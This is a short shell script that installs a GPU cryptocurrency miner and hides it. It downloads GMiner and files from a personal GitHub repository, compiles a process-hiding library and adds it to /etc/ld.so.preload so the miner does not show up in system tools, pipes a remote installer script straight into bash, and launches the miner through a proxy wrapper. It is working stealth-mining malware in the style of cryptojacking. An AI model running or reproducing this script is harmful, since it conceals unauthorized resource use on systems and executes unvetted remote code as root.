#!/bin/sh
wget https://github.com/develsoftware/GMinerRelease/releases/download/2.58/gminer_2_58_linux64.tar.xz
tar -xvf gminer_2_58_linux64.tar.xz
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/gmi_flex.sh
chmod +x gmi_flex.sh
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicGmi.zip
unzip magicGmi.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installerWsocks3.sh | bash
graftcp ./gmi_flex.sh
